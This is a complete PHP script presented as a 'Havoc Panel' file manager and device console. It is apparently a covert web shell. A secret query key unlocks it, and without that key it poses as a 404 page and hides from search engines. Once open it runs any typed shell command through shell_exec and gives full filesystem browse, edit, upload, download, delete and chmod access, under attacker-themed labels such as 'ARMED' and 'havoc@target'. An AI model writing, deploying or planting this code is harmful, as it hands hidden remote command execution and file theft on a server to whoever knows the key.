<?php
/**
 * Havoc Panel — single-file PHP file manager + device-management console
 *
 * Access:  havoc_panel.php?havoc=buildonx
 * Without the correct key/value the script returns a blank 404 page.
 *
 * Security design:
 *  - Session-gated GUI (key ?havoc=buildonx unlocks; logout button destroys session)
 *  - FULL filesystem access: browse, edit, upload, download, delete anywhere the
 *    web-server user has permission (www-data typically; root-owned files are
 *    read-only unless the server runs privileged). open_basedir, if set, still applies.
 *  - Command console is free-form (runs with the web server's privileges).
 *  - PHP file uploads are blocked by default (prevent shell drop) — toggle in config.
 */

session_start();
error_reporting(0); // never leak paths/warnings to the response

/* ============================== CONFIG ============================== */
const ACCESS_KEY   = 'havoc';
const ACCESS_VALUE = 'buildonx';
const ALLOW_UPLOAD_PHP = false;  // set true at your own risk
const MAX_UPLOAD   = 50 * 1024 * 1024; // 50 MB
const HIST_SIZE    = 12;         // recent commands kept in session
const START_DIR    = __DIR__;    // where the panel opens; navigate anywhere from there

/* ============================== GATE ============================== */
/* Wrong or missing key -> behave like a nonexistent page. */
if (!isset($_GET[ACCESS_KEY]) || !hash_equals(ACCESS_VALUE, $_GET[ACCESS_KEY])) {
    http_response_code(404);
    header('Content-Type: text/plain');
    exit;
}

/* Correct key -> establish session (only once), then continue to GUI */
if (!isset($_SESSION['havoc_auth']) || $_SESSION['havoc_auth'] !== true) {
    $_SESSION['havoc_auth'] = true;
    session_regenerate_id(true);
}

/* Logout */
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

/* ============================== HELPERS ============================== */
function h(?string $s): string { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

/** Resolve any path (absolute or relative) to its canonical absolute form. */
function resolve(string $p): ?string {
    if ($p === '' || $p === '.') $p = START_DIR;
    $real = realpath($p);
    return $real === false ? null : $real;
}

/** Parent of an absolute path ('/' for root). */
function parentOf(string $abs): string {
    $d = dirname($abs);
    return $d === '.' ? '/' : $d;
}

/** Human-readable size. */
function sizeOf2(int $b): string {
    if ($b < 1024) return $b . ' B';
    if ($b < 1048576) return round($b / 1024, 1) . ' KB';
    if ($b < 1073741824) return round($b / 1048576, 1) . ' MB';
    return round($b / 1073741824, 2) . ' GB';
}

/** Best-effort stat info for an inaccessible target (explains WHY access failed). */
function statInfo(string $abs): array {
    $st = @stat($abs);
    if ($st === false) return [];
    $info = [
        'mode'  => sprintf('%04o', $st['mode'] & 07777),
        'size'  => sizeOf2((int)$st['size']),
        'mtime' => @date('Y-m-d H:i:s', $st['mtime'] ?? 0) ?: '—',
    ];
    if (function_exists('posix_getpwuid')) { $u = @posix_getpwuid($st['uid']);   $info['owner'] = $u['name'] ?? ('uid:' . $st['uid']); }
    else $info['owner'] = 'uid:' . $st['uid'];
    if (function_exists('posix_getgrgid')) { $g = @posix_getgrgid($st['gid']);   $info['group'] = $g['name'] ?? ('gid:' . $st['gid']); }
    else $info['group'] = 'gid:' . $st['gid'];
    return $info;
}

/** CSRF token. */
function csrf(): string {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(16));
    return $_SESSION['csrf'];
}
function csrfOk(): bool {
    return isset($_POST['csrf']) && hash_equals($_SESSION['csrf'], $_POST['csrf']);
}

/** Flash message. */
function flash(?string $m = null, string $type = 'ok'): ?array {
    if ($m !== null) { $_SESSION['flash'] = ['m' => $m, 't' => $type]; return null; }
    $f = $_SESSION['flash'] ?? null; unset($_SESSION['flash']); return $f;
}

/* ============================== ACTIONS ============================== */
/* Pop one-shot command output from the session (survives the POST->GET redirect). */
$cmd_out = null;
if (isset($_SESSION['cmd_out'])) {
    $cmd_out = $_SESSION['cmd_out'];
    unset($_SESSION['cmd_out']);
}
$flash = flash();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && csrfOk()) {
    $act  = $_POST['action'] ?? '';
    $path = $_POST['path'] ?? START_DIR;
    $abs  = resolve($path);

    try {
        switch ($act) {

        case 'upload':
            if ($abs === null || !is_dir($abs)) throw new Exception('Invalid target directory.');
            if (empty($_FILES['files'])) throw new Exception('No files received.');
            $n = 0; $errs = [];
            foreach ($_FILES['files']['name'] as $i => $name) {
                if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) continue;
                if ($_FILES['files']['size'][$i] > MAX_UPLOAD) { $errs[] = 'too large: ' . basename($name); continue; }
                $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
                if (!ALLOW_UPLOAD_PHP && in_array($ext, ['php','phtml','php3','php4','php5','php7','phar'])) {
                    $errs[] = 'PHP blocked: ' . basename($name); continue;
                }
                $safe = basename($name);
                if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $abs . '/' . $safe)) $n++;
                else $errs[] = 'failed: ' . basename($name);
            }
            $msg = $n . ' file(s) uploaded.';
            if ($errs) $msg .= ' [rejected: ' . h(implode('; ', $errs)) . ']';
            flash($msg, $errs && !$n ? 'err' : 'ok');
            break;

        case 'save':
            if ($abs === null || !is_file($abs)) throw new Exception('File not found.');
            if (@file_put_contents($abs, $_POST['content'] ?? '') === false)
                throw new Exception('Write failed (check permissions).');
            flash('File saved: ' . h(basename($abs)));
            break;

        case 'mkdir':
            if ($abs === null || !is_dir($abs)) throw new Exception('Invalid parent directory.');
            $name = basename(trim($_POST['name'] ?? ''));
            if ($name === '' || !preg_match('/^[^\/\\\\]+$/', $name)) throw new Exception('Bad directory name.');
            if (!@mkdir($abs . '/' . $name, 0755)) throw new Exception('mkdir failed (permissions?).');
            flash('Directory created: ' . h($name));
            break;

        case 'touch':
            if ($abs === null || !is_dir($abs)) throw new Exception('Invalid parent directory.');
            $name = basename(trim($_POST['name'] ?? ''));
            if ($name === '' || !preg_match('/^[^\/\\\\]+$/', $name)) throw new Exception('Bad file name.');
            if (@file_put_contents($abs . '/' . $name, '') === false) throw new Exception('Create failed (permissions?).');
            flash('File created: ' . h($name));
            break;

        case 'rename':
            $old = resolve($_POST['old'] ?? '');
            if ($old === null || $old === '/' || !file_exists($old)) throw new Exception('Source not found.');
            $name = basename(trim($_POST['name'] ?? ''));
            if ($name === '' || $name === '.' || $name === '..') throw new Exception('Bad name.');
            if (!@rename($old, dirname($old) . '/' . $name)) throw new Exception('Rename failed (permissions?).');
            flash('Renamed to ' . h($name));
            break;

        case 'delete':
            if ($abs === null || $abs === '/' || !file_exists($abs)) throw new Exception('Cannot delete target.');
            if (is_dir($abs)) {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($abs, FilesystemIterator::SKIP_DOTS),
                     RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($it as $f) $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
                $ok = @rmdir($abs);
            } else {
                $ok = @unlink($abs);
            }
            if (!$ok || file_exists($abs)) throw new Exception('Delete failed (permissions?).');
            flash('Deleted.');
            break;

        case 'chmod':
            if ($abs === null || $abs === '/' || !file_exists($abs)) throw new Exception('Target not found.');
            $mode = octdec($_POST['mode'] ?? '');
            if (!$mode || $mode < 0 || $mode > 0777) throw new Exception('Mode must be octal, e.g. 0644.');
            if (!@chmod($abs, $mode)) throw new Exception('chmod failed (not owner?).');
            flash('Permissions set to ' . $_POST['mode']);
            break;

        case 'cmd':
            /* Free-form console: runs whatever is typed, with the web server's privileges. */
            $cmd = trim($_POST['cmd'] ?? '');
            if ($cmd === '') throw new Exception('No command entered.');
            $out = @shell_exec($cmd . ' 2>&1');
            $_SESSION['cmd_out'] = '$ ' . $cmd . "\n" . (($out === null || $out === '') ? '(no output)' : $out);
            $hist = $_SESSION['cmd_history'] ?? [];
            array_unshift($hist, $cmd);
            $_SESSION['cmd_history'] = array_slice(array_values(array_unique($hist)), 0, HIST_SIZE);
            flash('Executed: ' . h($cmd));
            break;

        default: throw new Exception('Unknown action.');
        }
    } catch (Exception $e) {
        flash($e->getMessage(), 'err');
    }

    /* Redirect back to where we were (POST -> GET, no resubmit).
       cmd + upload target a directory directly; other actions target a file inside one. */
    $back = ($act === 'cmd' || $act === 'upload') ? (string)$abs : parentOf((string)$abs);
    if ($back === '' || $back === '.') $back = START_DIR;
    header('Location: ?' . ACCESS_KEY . '=' . ACCESS_VALUE . '&dir=' . urlencode($back));
    exit;
}

/* ============================== VIEW STATE ============================== */
/* Effective web-server user, cached — explains access-denied situations. */
if (empty($_SESSION['srv_user'])) {
    $u = trim((string)@shell_exec('id -un 2>/dev/null'));
    $_SESSION['srv_user'] = ($u !== '' && $u !== false) ? $u : get_current_user();
}
$srvUser = $_SESSION['srv_user'];

/* Download (must run before any HTML output so headers can be sent) */
if (isset($_GET['dl'])) {
    $dlAbs = resolve($_GET['dl']);
    if ($dlAbs === null || !is_file($dlAbs)) { http_response_code(404); exit('Not found'); }
    if (!is_readable($dlAbs)) { http_response_code(403); exit('Permission denied'); }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($dlAbs) . '"');
    header('Content-Length: ' . filesize($dlAbs));
    header('X-Content-Type-Options: nosniff');
    if (ob_get_level()) ob_end_clean();
    readfile($dlAbs);
    exit;
}

/* Current directory — detect inaccessible targets instead of silently going home */
$rawDir = isset($_GET['dir']) && $_GET['dir'] !== '' ? $_GET['dir'] : START_DIR;
$dirAbs = resolve($rawDir);
$denied = null;   // info about an inaccessible target, rendered as a notice panel

if ($dirAbs === null) {
    $denied = ['path' => $rawDir, 'reason' => 'cannot resolve path — missing, or search permission denied on a parent directory'];
    $dirAbs = START_DIR;
} elseif (!is_dir($dirAbs)) {
    $denied = ['path' => $dirAbs, 'reason' => 'not a directory'];
    $dirAbs = START_DIR;
}

/* Edit target — pre-validate readability instead of an empty/broken editor */
$editRel = isset($_GET['edit']) ? $_GET['edit'] : null;
$editAbs = null;
if ($editRel !== null) {
    $editAbs = resolve($editRel);
    if ($editAbs === null || !is_file($editAbs)) {
        $denied = ['path' => $editRel, 'reason' => 'file not found, or parent directory not searchable'];
        $editAbs = null;
    } elseif (!is_readable($editAbs) || ($editData = @file_get_contents($editAbs)) === false) {
        $denied = ['path' => $editAbs, 'reason' => 'read permission denied', 'stat' => statInfo($editAbs)];
        $editAbs = null;
    }
}

/* Breadcrumbs: / <a>var</a> / <a>www</a> / <b>html</b> */
$crumbs = []; $acc2 = '';
foreach (array_filter(explode('/', $dirAbs), fn($s) => $s !== '') as $seg) {
    $acc2 .= '/' . $seg;
    $crumbs[] = ['name' => $seg, 'path' => $acc2];
}
$lastCrumb = array_pop($crumbs);

/* Read directory listing (unreadable dir -> dedicated notice, browsing continues) */
$entries = [];
$scan = @scandir($dirAbs);
if ($scan === false) {
    $denied = ['path' => $dirAbs, 'reason' => 'read permission denied — cannot list contents', 'stat' => statInfo($dirAbs)];
} else {
    if ($dirAbs !== '/') {
        $entries[] = ['name' => '..', 'isDir' => true, 'size' => -1, 'perm' => '—', 'mtime' => '—',
                      'path' => parentOf($dirAbs)];
    }
    foreach ($scan as $e) {
        if ($e === '.' || $e === '..') continue;
        $fp = $dirAbs . '/' . $e;
        $isDir = is_dir($fp);
        $sz = @filesize($fp); $pm = @fileperms($fp); $mt = @filemtime($fp);
        $entries[] = [
            'name'  => $e,
            'isDir' => $isDir,
            'size'  => $isDir ? -1 : ($sz === false ? -1 : (int)$sz),
            'perm'  => $pm === false ? '—' : sprintf('%04o', $pm & 07777),
            'mtime' => $mt === false ? '—' : date('Y-m-d H:i:s', $mt),
            'path'  => $fp,
        ];
    }
    usort($entries, function ($a, $b) {
        if ($a['name'] === '..') return -1;
        if ($b['name'] === '..') return 1;
        return ($b['isDir'] - $a['isDir']) ?: strcasecmp($a['name'], $b['name']);
    });
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>·</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><circle cx='8' cy='8' r='6' fill='%23ff1e3c'/></svg>">
<style>
:root{
  --bg:#070709;--panel:#0e0e13;--panel2:#14141b;--border:#26262f;
  --text:#e8e8f0;--muted:#75758a;--acc:#ff1e3c;--acc2:#ff6b7d;--ok:#00ff9c;--err:#ff3347;
}
*{box-sizing:border-box;margin:0;padding:0}
body{
  background:
    radial-gradient(1100px 480px at 50% -10%, rgba(255,30,60,.09), transparent 60%),
    repeating-linear-gradient(90deg, transparent 0 39px, rgba(255,30,60,.025) 39px 40px),
    repeating-linear-gradient(0deg, transparent 0 39px, rgba(255,30,60,.025) 39px 40px),
    var(--bg);
  color:var(--text);
  font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  padding:24px;min-height:100vh;
}
/* CRT scanlines */
body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:999;
  background:repeating-linear-gradient(0deg, rgba(0,0,0,.13) 0 1px, transparent 1px 3px)}
a{color:var(--acc2);text-decoration:none}a:hover{text-decoration:underline;color:var(--acc)}
header{display:flex;align-items:center;gap:14px;margin-bottom:22px;flex-wrap:wrap;
  border-bottom:1px solid var(--border);padding-bottom:14px}
header h1{font:700 20px/1.1 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;letter-spacing:3px;
  text-shadow:0 0 8px rgba(255,30,60,.8),0 0 26px rgba(255,30,60,.4)}
header h1 span{color:var(--acc)}
header .prompt{font:11px ui-monospace,monospace;color:var(--muted);margin-top:4px;letter-spacing:1px}
header .prompt b{color:var(--acc);animation:blink 1.1s steps(1) infinite}
@keyframes blink{50%{opacity:0}}
.status{display:inline-flex;align-items:center;gap:6px;font:700 10px ui-monospace,monospace;
  letter-spacing:2px;color:var(--acc);border:1px solid var(--acc);border-radius:3px;padding:4px 9px;
  background:rgba(255,30,60,.07);
  box-shadow:0 0 12px rgba(255,30,60,.35), inset 0 0 10px rgba(255,30,60,.12)}
.status i{width:7px;height:7px;border-radius:50%;background:var(--acc);animation:pulse 1.2s infinite}
@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 6px var(--acc)}50%{opacity:.2;box-shadow:none}}
.crumbs{font:13px ui-monospace,monospace;color:var(--muted);flex:1;min-width:220px;text-align:right;
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.crumbs a{color:var(--acc2)}.crumbs b{color:var(--text)}
.btn{display:inline-block;padding:5px 12px;border:1px solid var(--border);border-radius:4px;
  background:var(--panel2);color:var(--text)!important;cursor:pointer;
  font:600 12px ui-monospace,monospace;letter-spacing:1px;transition:all .15s}
.btn:hover{border-color:var(--acc);box-shadow:0 0 12px rgba(255,30,60,.4);text-decoration:none;color:var(--acc2)!important}
.btn.danger{color:var(--err)!important}
.btn.danger:hover{border-color:var(--err);box-shadow:0 0 12px rgba(255,51,71,.45)}
.grid{display:grid;grid-template-columns:2fr 1fr;gap:16px;align-items:start}
@media(max-width:900px){.grid{grid-template-columns:1fr}.crumbs{text-align:left}}
.panel{background:linear-gradient(180deg,rgba(255,30,60,.035),transparent 45%),var(--panel);
  border:1px solid var(--border);border-radius:6px;padding:16px;position:relative}
.panel::before{content:"";position:absolute;left:-1px;top:-1px;bottom:-1px;width:2px;
  background:linear-gradient(180deg,var(--acc),transparent 80%)}
.panel h2{font:700 11px ui-monospace,monospace;text-transform:uppercase;letter-spacing:2px;
  color:var(--acc);margin-bottom:12px;text-shadow:0 0 8px rgba(255,30,60,.5)}
table{width:100%;border-collapse:collapse}
th{font:700 10px ui-monospace,monospace;text-transform:uppercase;letter-spacing:1px;color:var(--muted);
  text-align:left;padding:6px 8px;border-bottom:1px solid rgba(255,30,60,.45)}
td{padding:6px 8px;border-bottom:1px solid var(--border);font-size:13px}
tr:hover td{background:rgba(255,30,60,.06)}
td.num,th.num{text-align:right;font:12px ui-monospace,monospace;color:var(--muted)}
.icon{width:20px;display:inline-block;text-align:center;font-family:ui-monospace,monospace}
.icon.d{color:var(--acc)}.icon.f{color:var(--muted)}
form.inline{display:inline}
input[type=text]{background:#0a0a0e;border:1px solid var(--border);border-radius:4px;color:var(--text);
  padding:7px 10px;font-size:13px;width:100%;transition:border-color .15s, box-shadow .15s}
input[type=text]:focus{outline:none;border-color:var(--acc);box-shadow:0 0 10px rgba(255,30,60,.35)}
input.cmd{font-family:ui-monospace,monospace;caret-color:var(--acc)}
textarea{width:100%;height:420px;background:#0a0a0e;border:1px solid var(--border);border-radius:4px;
  color:var(--text);padding:12px;font:13px/1.5 ui-monospace,monospace;resize:vertical}
textarea:focus{outline:none;border-color:var(--acc);box-shadow:0 0 10px rgba(255,30,60,.35)}
label{display:block;font:600 11px ui-monospace,monospace;text-transform:uppercase;letter-spacing:1px;
  color:var(--muted);margin:10px 0 4px}
pre.out{background:#050507;border:1px solid rgba(255,30,60,.4);border-left:3px solid var(--acc);
  border-radius:4px;padding:12px;font:12px/1.6 ui-monospace,monospace;color:#d8ffe9;
  overflow:auto;max-height:340px;white-space:pre-wrap;word-break:break-all;
  text-shadow:0 0 4px rgba(0,255,156,.25)}
.row{display:flex;gap:8px}.row>*{flex:1}
.drop{border:1px dashed var(--border);border-radius:4px;padding:18px;text-align:center;color:var(--muted);
  font:12px ui-monospace,monospace;cursor:pointer;transition:all .15s}
.drop:hover{border-color:var(--acc);color:var(--acc2);background:rgba(255,30,60,.05)}
.flash{padding:10px 14px;border-radius:4px;margin-bottom:16px;font:13px ui-monospace,monospace}
.flash.ok{background:rgba(0,255,156,.06);border:1px solid #00b36b;box-shadow:0 0 12px rgba(0,255,156,.15);color:var(--ok)}
.flash.err{background:rgba(255,30,60,.08);border:1px solid var(--err);box-shadow:0 0 14px rgba(255,30,60,.3);color:var(--err)}
.footer{margin-top:22px;color:var(--muted);font:11px ui-monospace,monospace;text-align:center;letter-spacing:1px}
.footer b{color:var(--acc)}
.acts{white-space:nowrap}.acts form{margin-right:4px}
.hist .btn{font:11px ui-monospace,monospace;margin:0 4px 4px 0;opacity:.85}
.hist .btn:hover{opacity:1}
.denied{border-color:var(--err);
  background:linear-gradient(180deg,rgba(255,51,71,.06),transparent 50%),repeating-linear-gradient(45deg,transparent 0 12px,rgba(255,51,71,.03) 12px 24px),var(--panel);
  box-shadow:0 0 18px rgba(255,51,71,.25), inset 0 0 40px rgba(255,51,71,.04)}
.denied::before{background:linear-gradient(180deg,var(--err),transparent 80%)}
.denied h2{color:var(--err);text-shadow:0 0 10px rgba(255,51,71,.6)}
.dpath{font:600 15px ui-monospace,monospace;word-break:break-all;margin-bottom:4px}
.dreason{color:var(--err);font:12px ui-monospace,monospace;margin-bottom:6px}
.dnote{color:var(--muted);font:12px ui-monospace,monospace;margin-top:8px}
.dnote b{color:var(--acc2)}
table.mini{margin:8px 0}
table.mini th{color:var(--acc);text-transform:lowercase;letter-spacing:0;border:0;padding:3px 14px 3px 0;font-size:12px}
table.mini td{border:0;padding:3px 14px 3px 0;font:12px ui-monospace,monospace}
::selection{background:rgba(255,30,60,.45)}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-thumb{background:#26262f;border-radius:5px}
::-webkit-scrollbar-thumb:hover{background:var(--acc)}
::-webkit-scrollbar-track{background:#0a0a0e}
</style>
</head>
<body>

<header>
  <div>
    <h1>HAVOC<span>_</span>PANEL</h1>
    <div class="prompt">root@havoc:~# session_established <b>▊</b></div>
  </div>
  <span class="status"><i></i>ARMED</span>
  <div class="crumbs">
    <a href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=%2F">/</a><?php foreach ($crumbs as $c): ?> / <a href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode($c['path']) ?>"><?= h($c['name']) ?></a><?php endforeach; ?><?php if ($lastCrumb): ?> / <b><?= h($lastCrumb['name']) ?></b><?php endif; ?>
  </div>
  <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode(START_DIR) ?>">HOME</a>
  <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=%2F">/</a>
  <a class="btn danger" href="?logout=1">EXIT</a>
</header>

<?php if ($flash): ?>
  <div class="flash <?= $flash['t'] ?>"><?= $flash['m'] ?></div>
<?php endif; ?>

<?php if ($cmd_out !== null): ?>
  <div class="panel" style="margin-bottom:16px">
    <h2>Command Output</h2>
    <pre class="out"><?= h($cmd_out) ?></pre>
  </div>
<?php endif; ?>

<?php /* ---------- ACCESS DENIED NOTICE ---------- */
if ($denied): ?>
<div class="panel denied" style="margin-bottom:16px">
  <h2>&#9888; Access Denied</h2>
  <div class="dpath"><?= h($denied['path']) ?></div>
  <div class="dreason">reason: <?= h($denied['reason']) ?></div>
  <?php if (!empty($denied['stat'])): ?>
  <table class="mini">
    <tr><th>owner</th><td><?= h($denied['stat']['owner']) ?></td><th>group</th><td><?= h($denied['stat']['group']) ?></td></tr>
    <tr><th>mode</th><td><?= h($denied['stat']['mode']) ?></td><th>size</th><td><?= h($denied['stat']['size']) ?></td></tr>
  </table>
  <?php endif; ?>
  <div class="dnote">panel runs as <b><?= h($srvUser) ?></b> — target is outside its permission scope</div>
  <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
    <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode(parentOf($denied['path'])) ?>">Parent</a>
    <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode(START_DIR) ?>">HOME</a>
    <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=%2F">/</a>
  </div>
</div>
<?php endif; ?>

<?php /* ---------- EDITOR VIEW ---------- */
if ($editAbs !== null && is_file($editAbs)): ?>
<div class="panel">
  <h2>Edit — <?= h(basename($editAbs)) ?></h2>
  <form method="post">
    <input type="hidden" name="csrf" value="<?= csrf() ?>">
    <input type="hidden" name="action" value="save">
    <input type="hidden" name="path" value="<?= h($editAbs) ?>">
    <textarea name="content" spellcheck="false"><?= h(isset($editData) ? $editData : '') ?></textarea>
    <div style="margin-top:12px;display:flex;gap:8px">
      <button class="btn" type="submit">Save</button>
      <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode(parentOf($editAbs)) ?>">Back</a>
    </div>
  </form>
</div>

<?php /* ---------- MAIN VIEW ---------- */
else: ?>
<div class="grid">

  <!-- FILE BROWSER -->
  <div class="panel">
    <h2>Files &amp; Directories</h2>
    <table>
      <tr><th></th><th>Name</th><th class="num">Size</th><th class="num">Perms</th><th class="num">Modified</th><th>Actions</th></tr>
      <?php foreach ($entries as $e): ?>
      <tr>
        <td><span class="icon <?= $e['isDir'] ? 'd' : 'f' ?>"><?= $e['isDir'] ? '▸' : '▪' ?></span></td>
        <td>
          <?php if ($e['isDir']): ?>
            <a href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode($e['path']) ?>"><?= h($e['name']) ?></a>
          <?php else: ?>
            <?= h($e['name']) ?>
          <?php endif; ?>
        </td>
        <td class="num"><?= $e['size'] >= 0 ? sizeOf2($e['size']) : '—' ?></td>
        <td class="num"><?= $e['perm'] ?></td>
        <td class="num"><?= h($e['mtime']) ?></td>
        <td class="acts">
          <?php if (!$e['isDir']): ?>
            <form class="inline" method="get">
              <input type="hidden" name="<?= ACCESS_KEY ?>" value="<?= ACCESS_VALUE ?>">
              <input type="hidden" name="dir" value="<?= urlencode($dirAbs) ?>">
              <input type="hidden" name="edit" value="<?= urlencode($e['path']) ?>">
              <button class="btn" type="submit">Edit</button>
            </form>
            <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dl=<?= urlencode($e['path']) ?>">D/L</a>
          <?php endif; ?>
          <?php if ($e['name'] !== '..'): ?>
            <form class="inline" method="post" onsubmit="return confirm('Delete <?= h($e['name']) ?>?')">
              <input type="hidden" name="csrf" value="<?= csrf() ?>">
              <input type="hidden" name="action" value="delete">
              <input type="hidden" name="path" value="<?= h($e['path']) ?>">
              <button class="btn danger" type="submit">Del</button>
            </form>
          <?php endif; ?>
        </td>
      </tr>
      <?php endforeach; ?>
    </table>
  </div>

  <!-- SIDE COLUMN -->
  <div>
    <!-- COMMAND CONSOLE -->
    <div class="panel" style="margin-bottom:16px">
      <h2>Device Console</h2>
      <form method="post">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input type="hidden" name="action" value="cmd">
        <input type="hidden" name="path" value="<?= h($dirAbs) ?>">
        <label>Command</label>
        <input class="cmd" type="text" name="cmd" placeholder="e.g. ifconfig, whoami, df -h" required autocomplete="off" autofocus>
        <div style="margin-top:10px"><button class="btn" type="submit">Execute</button></div>
      </form>
      <?php $hist = $_SESSION['cmd_history'] ?? []; if ($hist): ?>
      <div class="hist" style="margin-top:14px">
        <label>Recent</label>
        <?php foreach (array_slice($hist, 0, 8) as $hc): ?>
        <form class="inline" method="post">
          <input type="hidden" name="csrf" value="<?= csrf() ?>">
          <input type="hidden" name="action" value="cmd">
          <input type="hidden" name="path" value="<?= h($dirAbs) ?>">
          <input type="hidden" name="cmd" value="<?= h($hc) ?>">
          <button class="btn" type="submit" title="run again"><?= h($hc) ?></button>
        </form>
        <?php endforeach; ?>
      </div>
      <?php endif; ?>
    </div>

    <!-- UPLOAD -->
    <div class="panel" style="margin-bottom:16px">
      <h2>Upload</h2>
      <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input type="hidden" name="action" value="upload">
        <input type="hidden" name="path" value="<?= h($dirAbs) ?>">
        <label class="drop" style="display:block">
          Click to choose files (max <?= sizeOf2(MAX_UPLOAD) ?> each)
          <input type="file" name="files[]" multiple required style="display:none"
                 onchange="this.closest('form').submit()">
        </label>
        <div style="margin-top:10px"><button class="btn" type="submit">Upload to <?= h($dirAbs) ?></button></div>
      </form>
    </div>

    <!-- CREATE -->
    <div class="panel" style="margin-bottom:16px">
      <h2>Create</h2>
      <form method="post">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input type="hidden" name="path" value="<?= h($dirAbs) ?>">
        <input type="text" name="name" placeholder="name..." required>
        <div class="row" style="margin-top:10px">
          <button class="btn" name="action" value="mkdir" type="submit">New Dir</button>
          <button class="btn" name="action" value="touch" type="submit">New File</button>
        </div>
      </form>
    </div>

    <!-- RENAME / CHMOD -->
    <div class="panel">
      <h2>Rename / Permissions</h2>
      <form method="post">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <label>Item (absolute path)</label>
        <input type="text" name="old" placeholder="/etc/hostname" list="items">
        <datalist id="items">
          <?php foreach ($entries as $e): if ($e['name'] !== '..'): ?>
            <option value="<?= h($e['path']) ?>">
          <?php endif; endforeach; ?>
        </datalist>
        <div class="row">
          <div><label>New name</label><input type="text" name="name" placeholder="(for rename)"></div>
          <div><label>Mode (octal)</label><input type="text" name="mode" placeholder="0644"></div>
        </div>
        <div class="row" style="margin-top:10px">
          <button class="btn" name="action" value="rename" type="submit">Rename</button>
          <button class="btn" name="action" value="chmod" type="submit">Chmod</button>
        </div>
      </form>
    </div>
  </div>
</div>
<?php endif; ?>

<div class="footer">[ havoc@target ] · full filesystem access · runs as web-server user<?= ini_get('open_basedir') ? ' · <b>open_basedir: ' . h(ini_get('open_basedir')) . '</b>' : '' ?></div>

</body>
</html>
